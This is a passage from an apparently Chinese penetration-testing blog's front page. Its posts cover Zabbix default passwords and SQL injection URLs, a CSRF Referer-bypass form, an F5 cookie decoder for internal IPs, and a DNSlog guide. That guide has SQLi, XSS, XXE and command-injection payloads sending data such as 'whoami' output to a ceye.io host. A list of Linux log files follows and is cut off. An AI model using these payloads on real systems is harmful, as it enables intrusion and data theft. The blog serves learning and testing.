<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="沉迷渗透测试的信安菜鸟">
<meta property="og:type" content="website">
<meta property="og:title" content="菜鸟博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="菜鸟博客">
<meta property="og:description" content="沉迷渗透测试的信安菜鸟">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="菜鸟博客">
<meta name="twitter:description" content="沉迷渗透测试的信安菜鸟">





  
  
  <link rel="canonical" href="http://yoursite.com/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>菜鸟博客</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">菜鸟博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Zabbix漏洞汇总/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/12/27/Zabbix漏洞汇总/" class="post-title-link" itemprop="url">Zabbix漏洞汇总</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-12-27 11:21:13 / 修改时间：13:21:06" itemprop="dateCreated datePublished" datetime="2019-12-27T11:21:13+08:00">2019-12-27</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一、zabbix：</p>
<p>zabbix是监控是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p>
<p>二、Zabbix漏洞：</p>
<p>1、弱口令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WeapPassword = [(&quot;admin&quot;,&quot;zabbix&quot;),(&quot;Admin&quot;,&quot;zabbix&quot;),(&quot;guest&quot;,&quot;&quot;)]</span><br></pre></td></tr></table></figure>

<p>2、SQL注入</p>
<p>（1）</p>
<p>标题：latest.php处toogle_ids[]参数SQL注入</p>
<p>攻击条件：登陆后</p>
<p>危害：可获取系统权限</p>
<p>URL以及payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.b.c.d/latest.php?output.php=ajax&amp;sid=************&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids=updatexml(0,concat(0xa,database()),0)</span><br></pre></td></tr></table></figure>

<p>（2）</p>
<p>标题：jsrpc.php处profileIdx2参数SQL注入</p>
<p>攻击条件：无需登录，亦可以登录后使用高权限的sid、cookie进行替换</p>
<p>版本：v2.2.x, 3.0.0-3.0.3</p>
<p>危害：一般SQL注入危害</p>
<p>URL以及payload：</p>
<p><code>&quot;&quot;&quot;</code><br><code>http://a.b.c.d/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1</code><br><code>&quot;&quot;&quot;</code></p>
<p>（3）</p>
<p>标题：其他SQL注入漏洞：chart_bar.php处itemid参数和periods参数SQL注入；httpmon.php处applications参数SQL注入</p>
<p>攻击条件：不详</p>
<p>危害：不详</p>
<p>URL以及payload：一般SQL注入payload尝试</p>
<p>3、OS命令注入执行：</p>
<p>（1）弱口令登录后，使用zabbix自带的Script执行系统命令可以反弹shell等等</p>
<p>（2）防御：</p>
<p>　　#不要设置AllowRoot=1，避免agent和server以root权限启动。</p>
<p>　　#进制agent执行system.run，不要设置EnableRemoteCommands=1。</p>
<p>​    　#即使打补丁。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/CSRF绕过Referer校验/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/12/11/CSRF绕过Referer校验/" class="post-title-link" itemprop="url">CSRF绕过Referer校验</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-12-11 11:26:36 / 修改时间：11:27:53" itemprop="dateCreated datePublished" datetime="2019-12-11T11:26:36+08:00">2019-12-11</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>目录</p>
<ul>
<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#正常情况" target="_blank" rel="noopener">正常情况</a></li>
<li>不正常的情况<ul>
<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#添加无referer标签" target="_blank" rel="noopener">添加无Referer标签</a></li>
<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#自建服务器路径带referer字段名" target="_blank" rel="noopener">自建服务器路径带referer字段名</a></li>
</ul>
</li>
</ul>
<hr>
<h1 id="正常情况"><a href="#正常情况" class="headerlink" title="正常情况#"></a>正常情况<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#628046037" target="_blank" rel="noopener">#</a></h1><p>正常的情况下（服务器端校验Referer的代码没毛病），前端是无法绕过的。</p>
<p>我之前考虑过的方案：</p>
<ul>
<li>JS修改Referer，失败</li>
<li>后端用PHP语言编写发送包，问题是你怎么能跨域拿Cookie，失败</li>
</ul>
<h1 id="不正常的情况"><a href="#不正常的情况" class="headerlink" title="不正常的情况#"></a>不正常的情况<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#590862394" target="_blank" rel="noopener">#</a></h1><p>不正常的情况下（服务器端校验Referer的代码有漏洞），前端才能做到绕过，下面介绍几个可能会绕过Referer的案例；</p>
<h2 id="添加无Referer标签"><a href="#添加无Referer标签" class="headerlink" title="添加无Referer标签#"></a>添加无Referer标签<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#3703399181" target="_blank" rel="noopener">#</a></h2><blockquote>
<p>可以尝试无Referer标签，万一逻辑刚好没判断无Referer的情况呢；</p>
</blockquote>
<meta name="referrer" content="never">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Copy&lt;html&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="自建服务器路径带referer字段名"><a href="#自建服务器路径带referer字段名" class="headerlink" title="自建服务器路径带referer字段名#"></a>自建服务器路径带referer字段名<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#3302619800" target="_blank" rel="noopener">#</a></h2><blockquote>
<p>原理就是在路径上创建成原本referer中有的字段名，如果校验只是判断是否包含，那就666了；</p>
</blockquote>
<p><a href="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png" alt="img"></a></p>
<p>如果文章对你有帮助，可以给文章评论、点推荐哦<br>Github：<a href="https://github.com/Mysticbinary" target="_blank" rel="noopener">https://github.com/Mysticbinary</a><br>微信公众号： <a href="https://www.cnblogs.com/mysticbinary/p/12002297.html" target="_blank" rel="noopener">Mysticbinary</a><br>本文版权归作者所有，欢迎转载，但未经作者同意请保留此段声明，请在文章页面明显位置给出原文链接</p>
<p>分类: <a href="https://www.cnblogs.com/mysticbinary/category/1422334.html" target="_blank" rel="noopener">JavaScript</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/20/透过F5获取服务器真实内网IP技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/11/20/透过F5获取服务器真实内网IP技巧/" class="post-title-link" itemprop="url">透过F5获取服务器真实内网IP技巧</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-11-20 15:22:49 / 修改时间：15:38:40" itemprop="dateCreated datePublished" datetime="2019-11-20T15:22:49+08:00">2019-11-20</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="F5修改cookie机制"><a href="#F5修改cookie机制" class="headerlink" title="F5修改cookie机制"></a><strong>F5修改cookie机制</strong></h2><p>F5 LTM做负载均衡时，有多种机制实现会话保持。 其中用到很多的一种是通过修改cookie来实现的。</p>
<p>具体说来，F5在获取到客户端第一次请求时，会使用set cookie头，给客户端埋入一个特定的cookie。</p>
<p>比如： Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000</p>
<p>后续再接到客户端请求时，F5会查看cookie里面的字段，判断应该交给后续哪台服务器。</p>
<p>作为传统大厂，F5当然不会傻到直接把服务器IP address写入到cookie里面。 F5很巧妙的把server的真实IP address做了两次编码，然后再插入cookie。</p>
<p>所以，只要依据解码流畅，解开487098378.24095.0000的内容，就拿到了server的真实IP address。</p>
<h2 id="解码思路"><a href="#解码思路" class="headerlink" title="解码思路"></a><strong>解码思路</strong></h2><p>首先，把第一小节的十进制数取出来，也即，487098378 第二，将其转为十六进制数1d08880a 第三，从后至前，以此取四位数出来，也即，0a；88；08；1d； 第四，依次把他们转为十进制数：10；136；8；29 最后，得到真实内网IP：10.136.8.29</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>严格意义上说，只有内网的私有IP，对正面突破目标防线的帮助并不明显。 但是，当需要做内网渗透和漫游的时候，这一点信息还是有价值的。 再不济，写report的时候，如果实在没的可写的时候，还可以拿这点作为一个issue作为丰富report的素材。</p>
<p>#<a href="https://www.secpulse.com/archives/58730.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/58730.html</a></p>
<h2 id="安全脉搏附F5-cookies解密脚本"><a href="#安全脉搏附F5-cookies解密脚本" class="headerlink" title="安全脉搏附F5 cookies解密脚本"></a><strong>安全脉搏附F5 cookies解密脚本</strong></h2><p>给一个比较好用的py版本，可以带端口的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># example string: 110536896.20480.0000</span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">print &quot;Usage: %s encoded_string&quot; % sys.argv[0]</span><br><span class="line">exit(1)</span><br><span class="line"></span><br><span class="line">encoded_string = sys.argv[1]</span><br><span class="line">print &quot;\n[*] String to decode: %s\n&quot; % encoded_string</span><br><span class="line"></span><br><span class="line">(host, port, end) = encoded_string.split(&apos;.&apos;)</span><br><span class="line"></span><br><span class="line">(a, b, c, d) = [ord(i) for i in struct.pack(&quot;&lt;I&quot;, int(host))]</span><br><span class="line"></span><br><span class="line">(e) = [ord(e) for e in struct.pack(&quot;&lt;H&quot;, int(port))]</span><br><span class="line">port = &quot;0x%02X%02X&quot; % (e[0],e[1])</span><br><span class="line"></span><br><span class="line">print &quot;[*] Decoded Host and Port: %s.%s.%s.%s:%s\n&quot; % (a,b,c,d, int(port,16))</span><br></pre></td></tr></table></figure>


          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/巧用DNSlog实现无回显注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/11/08/巧用DNSlog实现无回显注入/" class="post-title-link" itemprop="url">巧用DNSlog实现无回显注入</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-11-08 17:26:32 / 修改时间：17:28:59" itemprop="dateCreated datePublished" datetime="2019-11-08T17:26:32+08:00">2019-11-08</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>测试一些网站的时候，一些注入都是无回显的，我们可以写脚本来进行盲注，但有些网站会ban掉我们的ip，这样我们可以通过设置ip代理池解决，</p>
<p>但是盲注往往效率很低，所以产生了DNSlog注入。具体原理如下。</p>
<p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216200508702-1121770116.png" alt="img"></p>
<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
<p>这样说原理很抽象，下面通过实际例子看下。</p>
<p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a> 这是一个免费的记录dnslog的平台，我们注册后到控制面板会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216201227264-923840991.png" alt="img"></p>
<p><strong>0x01SQL盲注</strong></p>
<p>就以sql盲注为例。深入理解下DNSlog注入过程：</p>
<p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>
<p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p>
<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216202407296-81048198.png" alt="img"></p>
<p>通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216202748999-1910455572.png" alt="img"></p>
<p>在mysql命令行执行：select load_file(‘\\afanti.xxxx.ceye.io\aaa’);其中afanti就是要注入的查询语句</p>
<p>查看平台，dnsLog被记录下来。</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216203651983-114953403.png" alt="img"></p>
<p>load_file()函数可以通过dns解析请求。</p>
<p>以sql-labs第五关：</p>
<p>payload：’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p>
<p>执行的sql语句：SELECT * FROM users WHERE id=’1’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)</p>
<p>查看dnslog日志，发现security数据库被查询出来：</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216204221827-1146117172.png" alt="img"></p>
<p><strong>0x02 XSS（无回显）</strong></p>
<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
<p>payload:&gt;<img src="http://xss.xxxx.ceye.io/aaa">让src请求我们的dnslog平台</p>
<p><img src="https://images2017.cnblogs.com/blog/1298490/201712/1298490-20171216205320671-1626266465.png" alt="img"></p>
<p><strong>0x03 SSRF(无回显)</strong></p>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root/&gt;</span><br></pre></td></tr></table></figure>

<p><strong>0x04命令执行（无回显）</strong></p>
<p>当 ping 一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*nixcurl http://haha.xxx.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.xxxx.ceye.ioWindowsping %USERNAME%.xxx.ceye.io也可以通过base64加密传送数据,平台拿到的数据进行base64解密得到命令回显。cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;del temp*</span><br></pre></td></tr></table></figure>

<p>其他的在这个平台上有一些payload。</p>
<p>参考链接：</p>
<p><a href="http://foreversong.cn/archives/861" target="_blank" rel="noopener">http://foreversong.cn/archives/861</a></p>
<p><a href="https://bbs.ichunqiu.com/thread-22002-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-22002-1-1.html</a></p>
<p><a href="http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/Linux日志文件-var-log详解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/24/Linux日志文件-var-log详解/" class="post-title-link" itemprop="url">Linux日志文件/var/log详解</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-24 17:01:13 / 修改时间：17:01:26" itemprop="dateCreated datePublished" datetime="2019-10-24T17:01:13+08:00">2019-10-24</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>如果愿意在Linux环境方面花费些时间，首先就应该知道日志文件的所在位置以及它们包含的内容。在系统运行正常的情况下学习了解这些不同的日志文件有助于你在遇到紧急情况时从容找出问题并加以解决。</p>
<p>以下介绍的是20个位于/var/log/ 目录之下的日志文件。其中一些只有特定版本采用，如dpkg.log只能在基于Debian的系统中看到。</p>
<ol>
<li>/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。</li>
<li>/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。</li>
<li>/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。</li>
<li>/var/log/boot.log — 包含系统启动时的日志。</li>
<li>/var/log/daemon.log — 包含各种系统后台守护进程日志信息。</li>
<li>/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。</li>
<li>/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。</li>
<li>/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。</li>
<li>/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。</li>
<li>/var/log/user.log — 记录所有等级用户信息的日志。</li>
<li>/var/log/Xorg.x.log — 来自X的日志信息。</li>
<li>/var/log/alternatives.log – 更新替代信息都记录在这个文件中。</li>
<li>/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。</li>
<li>/var/log/cups — 涉及所有打印信息的日志。</li>
<li>/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。</li>
<li>/var/log/yum.log — 包含使用yum安装的软件包信息。</li>
<li>/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。</li>
<li>/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。</li>
<li>/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。</li>
<li>/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</li>
</ol>
<p>除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录：</p>
<ul>
<li>/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。</li>
